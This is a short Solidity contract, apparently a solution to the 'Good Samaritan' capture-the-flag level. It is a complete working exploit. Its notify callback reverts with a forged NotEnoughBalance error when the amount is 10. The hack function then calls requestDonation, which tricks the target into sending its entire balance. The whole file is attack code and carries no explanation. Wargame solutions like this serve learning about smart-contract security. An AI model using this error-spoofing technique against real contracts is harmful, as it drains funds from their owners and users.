// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./contract.sol";

contract GoodSamaritanHack is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function hack(address samaritanAdr) public {
        GoodSamaritan(samaritanAdr).requestDonation();
    }
}
